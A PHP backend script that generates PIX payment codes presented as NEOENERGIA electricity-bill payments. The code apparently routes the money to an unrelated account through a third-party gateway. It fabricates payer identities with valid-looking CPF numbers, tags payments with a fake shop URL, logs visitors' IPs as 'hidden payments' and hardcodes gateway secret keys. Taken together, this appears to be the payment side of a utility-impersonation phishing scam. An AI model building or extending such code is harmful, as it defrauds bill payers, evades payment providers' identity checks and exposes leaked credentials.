<?php
error_reporting(0);
header('Content-Type: application/json; charset=utf-8');
require_once __DIR__ . '/app_storage.php';

// Tenta pegar JSON (POST)
$raw = file_get_contents('php://input');
$input = json_decode($raw, true);

if ($input) {
    $valor = $input['valor'] ?? null;
    $uc = $input['uc'] ?? null;
    $nomeRecebido = $input['nome'] ?? null;
} else {
    // Senão, pega GET
    $valor = $_GET['valor'] ?? null;
    $uc = $_GET['uc'] ?? null;
    $nomeRecebido = $_GET['nome'] ?? null;
}

if (!$valor || !$uc) {
    echo json_encode(['error' => 'Parâmetros valor ou uc não fornecidos. Valor: ' . ($valor ?? 'vazio') . ', UC: ' . ($uc ?? 'vazio')]);
    exit;
}



// Configurações
$pixKey = "809b3a6e-ac3d-44d4-9c1d-3006816cb0a8"; // Chave fixa ou dinâmica
$empresaNome = "NEOENERGIA";
$cidade = "BRASILIA";
$keyType = "ALEATORIA";

// Prepara os dados para a API externa
// O number_format aqui garante o formato "R$ 10,00"
 $amountFormatted = "R$ " . number_format($valor, 2, ',', '.');

$postData = [
    "key_type" => "Outro", // Mapeado para ALEATORIA TEM Q SER ALEATORIA SE NAO VAI FUNCIONAR
    "key" => $pixKey,
    "name" => $empresaNome,
    "city" => $cidade,
    "amount" => $amountFormatted,
    "reference" => "REF" . $uc
];


 // geração do PIX
 function gerarNome() {
    $nomes = ["João","Maria","Carlos","Ana","Lucas","Juliana","Fernando","Camila","Ricardo","Larissa"];
    $sobrenomes = ["Silva","Santos","Oliveira","Pereira","Costa","Almeida","Lima","Ferreira","Rodrigues","Martins"];
    return $nomes[array_rand($nomes)].' '.$sobrenomes[array_rand($sobrenomes)];
  }
    function gerarEmail($name) {
      $dominios = ["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com","icloud.com"];
      $nome = strtolower(str_replace(' ', '.', $name));
      $numero = rand(1, 999);
      return $nome.$numero.'@'.$dominios[array_rand($dominios)];
    }
    function gerarTelefone() {
      return rand(11, 99).'9'.rand(1000, 9999).rand(1000, 9999);
    }
    function calcularDV($n, $peso) {
      $soma = 0;
      for ($i = 0; $i < $peso - 1; $i++) $soma += $n[$i] * ($peso - $i);
      $resto = $soma % 11;
      return ($resto < 2) ? 0 : 11 - $resto;
    }
    function gerarCPF() {
      $n = [];
      for ($i = 0; $i < 9; $i++) $n[] = rand(0, 9);
      $n[9] = calcularDV($n, 10);
      $n[10] = calcularDV($n, 11);
      return implode('', $n);
    }
    function gerarOrderId() {
      $random = strtoupper(bin2hex(random_bytes(6)));
      return 'Z-'.substr($random, 0, 11);
    }

    
    
    $documento = gerarCPF();
    $nomes = $nomeRecebido ? trim($nomeRecebido) : gerarNome();
    $email = gerarEmail($nomes);
    $telefone = gerarTelefone();
    $orderId = gerarOrderId();


   $amountCents = number_format($valor, 2, '', '');
    $metadata = [
      "provider" => "Zedy",
      "user_email" => $email,
      "order_id" => $orderId,
      "checkout_url" => "https://seguro.comprandosegura.shop/order/$orderId",
      "shop_url" => "https://ffaf53-8a.myshopify.com",
    ];

     $publicKey = 'pk_cUBWFC0WbwAR1nMJHaqB-4NNA7Ed53hZ0EzCnGg4O8SIuR8H';
            $secretKey = 'sk_tdITaxJU423oTJQN2gdodQ4HyS9dsxJ2nQ-0W5zgJi0NbeR7';
    $auth = base64_encode($publicKey.':'.$secretKey);

    $payload = [
      "amount" => intval($amountCents),
      "paymentMethod" => "pix",
      "items" => [[
        "title" => "Pagamento de Debitos",
        "unitPrice" => intval($amountCents),
        "quantity" => 1,
        "tangible" => false,
      ]],
      "customer" => [
        "name" => $nomes,
        "email" => $email,
        "phone" => $telefone,
        "document" => [
          "number" => $documento,
          "type" => strlen($documento) == 11 ? "cpf" : "cnpj",
        ],
      ],
      "metadata" => json_encode($metadata, JSON_UNESCAPED_UNICODE),
    ];

    $ch = curl_init();
    curl_setopt_array($ch, [
      CURLOPT_URL => "https://api.sharkbanking.com.br/v1/transactions",
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_ENCODING => "",
      CURLOPT_MAXREDIRS => 10,
      CURLOPT_TIMEOUT => 30,
      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
      CURLOPT_CUSTOMREQUEST => "POST",
      CURLOPT_POSTFIELDS => json_encode($payload, JSON_UNESCAPED_UNICODE),
      CURLOPT_HTTPHEADER => [
        "accept: application/json",
        "authorization: Basic $auth",
        "content-type: application/json",
      ],
    ]);
   $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curlErr = curl_error($ch);
    curl_close($ch);

    if ($response === false) {
        echo json_encode(['error' => 'Erro na comunicação com a API de PIX: ' . $curlErr]);
        exit;
    }

    $pixResponse = json_decode($response, true);
    if (!$pixResponse) {
        echo json_encode(['error' => 'Resposta inválida da API externa de PIX: ' . $response]);
        exit;
    }

    $code = $pixResponse['pix']['qrcode'] ?? ($pixResponse['qrcode'] ?? ($pixResponse['emv'] ?? ($pixResponse['code'] ?? null)));
    $image = $pixResponse['pix']['image'] ?? ($pixResponse['image'] ?? null);

    if (!$code) {
        // Tenta pegar erro da própria resposta da API se houver
        $apiError = $pixResponse['message'] ?? ($pixResponse['error'] ?? 'Não foi possível obter o código PIX.');
        echo json_encode(['error' => 'API externa retornou erro: ' . $apiError]);
        exit;
    }

    // Se não veio imagem, gera uma a partir do code
    if (!$image) {
        $image = qr_base64_oculto($code);
    }

    // Logging
    try {
        $logPath = app_storage_path('pix_log_oculto.json');
        $logs = [];
        if (is_file($logPath)) {
            $logs = json_decode(@file_get_contents($logPath), true) ?? [];
        }
        if (count($logs) > 1000) array_shift($logs);
        
        $logs[] = [
            'ts' => date('c'),
            'ip' => $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0',
            'ua' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
            'valor' => $valor,
            'uc' => $uc,
            'status' => 'Gerado',
            'placa' => '',
            'renavam' => $uc,
            'descricao' => 'Pagamento Oculto',
            'nome' => $nomes
        ];
        @file_put_contents($logPath, json_encode($logs, JSON_PRETTY_PRINT));
    } catch (Throwable $e) {}

    echo json_encode([
        'code' => $code,
        'qrcode_base64' => $image,
        'reference' => "REF" . $uc
    ]);
    exit;

function qr_base64_oculto($payload) {
    $url = 'https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=' . urlencode($payload);
    $ch = curl_init();
    curl_setopt_array($ch, [
      CURLOPT_URL => $url,
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_TIMEOUT => 20,
      CURLOPT_FOLLOWLOCATION => true,
      CURLOPT_SSL_VERIFYPEER => false,
    ]);
    $png = curl_exec($ch);
    curl_close($ch);
    return $png ? ('data:image/png;base64,' . base64_encode($png)) : '';
}
